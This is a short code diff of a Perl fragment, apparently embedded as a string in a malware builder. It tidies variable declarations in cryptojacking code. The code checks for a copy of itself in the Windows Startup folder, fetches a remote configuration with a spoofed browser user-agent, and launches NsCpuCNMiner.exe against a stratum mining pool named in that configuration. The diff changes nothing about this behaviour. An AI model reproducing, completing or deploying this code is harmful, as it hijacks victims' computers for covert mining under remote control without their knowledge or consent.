@@ -98,10 +98,10 @@ END {
   use LWP::Simple qw[getstore];
   use Config;
   use Cwd;
-  my (\$response, \$disk, \$ua) = undef;
-  \$disk = getcwd;
+  
+  my \$disk = getcwd;
   if(\$disk =~ m/(\\w):\\/(\\w)/){\$disk = \$1;}
-  \$ua = LWP::UserAgent->new;
+  my \$ua = LWP::UserAgent->new;
   \$ua->agent(\"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4\");
   while(1){
     if(`dir %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup` !~ m/\$0/g){
@@ -119,7 +119,7 @@ END {
         next;
       }
     }
-    \$response = \$ua->get(\"$_[0]\");
+    my \$response = \$ua->get(\"$_[0]\");
     if(\$response->decoded_content =~ m/miner->host:(.+);email:(.+);|miner->host:(.+),email:(.+);/){
       system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
     }
